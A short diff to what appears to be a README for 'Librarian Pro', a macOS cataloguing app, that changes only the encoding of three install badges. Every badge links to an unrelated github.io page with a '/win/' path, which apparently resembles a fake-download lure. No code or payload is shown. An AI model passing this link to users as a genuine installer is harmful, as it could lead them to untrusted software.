@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Librarian Pro](https://img.shields.io/badge/⬇_Install_Librarian%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Librarian Pro](https://img.shields.io/badge/⬇_Install_Librarian+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Librarian Pro is a macOS media cataloging software for managing collections of b
 
 <div align="center">
 
-[![⬇ Install Librarian Pro](https://img.shields.io/badge/⬇_Install_Librarian%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Librarian Pro](https://img.shields.io/badge/⬇_Install_Librarian+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Librarian Pro is a macOS media cataloging software for managing collections of b
 
 <div align="center">
 
-[![⬇ Install Librarian Pro](https://img.shields.io/badge/⬇_Install_Librarian%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Librarian Pro](https://img.shields.io/badge/⬇_Install_Librarian+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
